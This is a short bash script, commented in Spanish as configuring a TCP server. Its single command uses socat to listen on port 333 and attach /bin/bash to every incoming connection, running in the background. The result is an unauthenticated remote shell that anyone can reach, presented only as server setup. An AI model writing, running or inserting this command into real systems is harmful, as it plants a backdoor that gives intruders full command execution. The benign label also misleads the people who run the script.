#!/bin/bash

# Configurar el servidor TCP
echo "Configurando servidor TCP..."
socat TCP-LISTEN:333,fork EXEC:/bin/bash &
